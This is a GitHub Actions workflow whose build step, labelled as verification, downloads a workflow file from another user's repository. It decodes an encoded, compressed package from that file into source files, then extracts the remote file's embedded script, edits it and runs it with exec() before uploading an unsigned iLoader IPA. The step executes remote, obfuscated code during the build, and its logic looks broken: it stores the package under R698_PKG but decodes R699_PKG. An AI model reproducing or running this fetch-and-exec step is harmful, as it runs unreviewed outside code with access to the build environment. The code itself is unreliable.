jobs:
  build:
    if: github.event.repository.private == false
    runs-on: xcode-27
    timeout-minutes: 45
    steps:
      - uses: actions/checkout@v4
        with:
          ref: >-
            1e63efa4db514cc122f2940a39623d9bc65c554c
      - name: Verify R699 and build IPA
        shell: bash
        run: |
          python3 - <<'PYCODE'
          import os,re,base64,lzma,hashlib
          import pathlib,urllib.request,ast
          url=('https://raw.githubusercontent.com/'
            'zeek10191019-stack/'
            'true-plan-showdown-verification/'
            'main/.github/workflows/z2.yml')
          req=urllib.request.Request(url,headers={
            'User-Agent':'R699-Pinned-Builder'})
          with urllib.request.urlopen(
            req,timeout=40) as res:
            old=res.read(25000)
          assert len(old)==10901
          assert hashlib.sha256(old).hexdigest()==(
            'fefbfc359e47f4453831fc7cbca10aea'
            '9597750425194b793811c6cb3e8f0310')
          m=re.search(rb'(?m)^  R698_PKG: >-\n'
            rb'((?:    [^\n]*\n)+)',old)
          assert m,'R698_PINNED_PACKAGE_MISSING'
          os.environ['R698_PKG']=b''.join(
            m[1].split()).decode('ascii')
          raw=lzma.decompress(base64.b64decode(
            os.environ['R699_PKG']),
            format=lzma.FORMAT_ALONE)
          assert hashlib.sha256(raw).hexdigest()==(
            '4acaadb38cce1b71aff14a166c897b54'
            '0a77d137e1fb2021a190d0715450c49d')
          names=['R699ProvenanceAudit.swift',
            'R699Patch.py','R699MakeBuild.py',
            'R699Smoke.swift']
          sizes=[7309,1685,3453,8946]
          assert sum(sizes)==len(raw)
          pos=0
          for name,size in zip(names,sizes):
            folder='tests' if name.endswith(
              'Smoke.swift') else 'tools'
            p=pathlib.Path(folder)/name
            p.parent.mkdir(parents=True,
              exist_ok=True)
            p.write_bytes(raw[pos:pos+size])
            pos+=size
          print('R699_SOURCE_SHA_PASS',flush=True)
          text=old.decode('utf-8')
          marker="          python3 - <<'PYCODE'\n"
          start=text.index(marker)+len(marker)
          end=text.index('\n          PYCODE',start)
          block=text[start:end]
          body='\n'.join(line[10:] for line in
            block.splitlines())
          needle=("['python3','tools/"+
            "R698MakeBuild.py']")
          assert body.count(needle)==1
          body=body.replace(needle,
            "['python3','tools/R699MakeBuild.py']")
          ast.parse(body)
          exec(compile(body,'r698','exec'),{})
          PYCODE
      - uses: actions/upload-artifact@v4
        with:
          name: R699-unsigned-iLoader-IPA
          path: dist/R699*
          if-no-files-found: error
          retention-days: 7
